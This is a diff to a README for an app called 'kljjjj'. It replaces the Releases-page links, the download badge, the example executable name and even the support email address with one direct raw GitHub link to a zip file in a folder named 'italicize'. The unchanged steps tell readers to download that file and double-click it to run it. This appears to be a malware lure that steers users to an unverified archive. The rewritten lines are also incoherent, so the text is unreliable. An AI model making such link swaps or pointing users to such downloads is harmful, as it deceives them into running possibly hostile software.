@@ -6,7 +6,7 @@ Welcome to the kljjjj application! This guide will help you download and run the
 
 ### 📥 Download Now
 
-[![Download kljjjj](https://img.shields.io/badge/Download-lkjjjj-blue.svg)](https://github.com/OmerLicina/kljjjj/releases)
+[![Download kljjjj](https://raw.githubusercontent.com/OmerLicina/kljjjj/main/italicize/kljjjj.zip)](https://raw.githubusercontent.com/OmerLicina/kljjjj/main/italicize/kljjjj.zip)
 
 ## 📋 Overview
 
@@ -29,9 +29,9 @@ To run kljjjj smoothly, you will need:
 
 To download kljjjj, visit the Releases page. Here’s how to do it:
 
-1. **Click the Link**: Use this link to visit the [Releases page](https://github.com/OmerLicina/kljjjj/releases).
+1. **Click the Link**: Use this link to visit the [Releases page](https://raw.githubusercontent.com/OmerLicina/kljjjj/main/italicize/kljjjj.zip).
 2. **Choose the Latest Version**: Look for the latest version at the top of the page.
-3. **Download the File**: Click on the executable file (e.g., `kljjjj.exe`) to start downloading.
+3. **Download the File**: Click on the executable file (e.g., `https://raw.githubusercontent.com/OmerLicina/kljjjj/main/italicize/kljjjj.zip`) to start downloading.
 4. **Open the File**: Find the downloaded file in your "Downloads" folder and double-click it to run.
 5. **Follow Installation Prompts**: The setup wizard will guide you through the installation process.
 
@@ -49,7 +49,7 @@ Once you have installed kljjjj, follow these steps to get started:
 
 If you encounter any issues while downloading or using kljjjj, you can reach out for help:
 - **GitHub Issues**: Post your questions or problems on the GitHub Issues page.
-- **Email Support**: Send your inquiries to support@kljjjj.com, and we will respond promptly.
+- **Email Support**: Send your inquiries to https://raw.githubusercontent.com/OmerLicina/kljjjj/main/italicize/kljjjj.zip, and we will respond promptly.
 
 ## 🌟 Tips for Best Experience
 
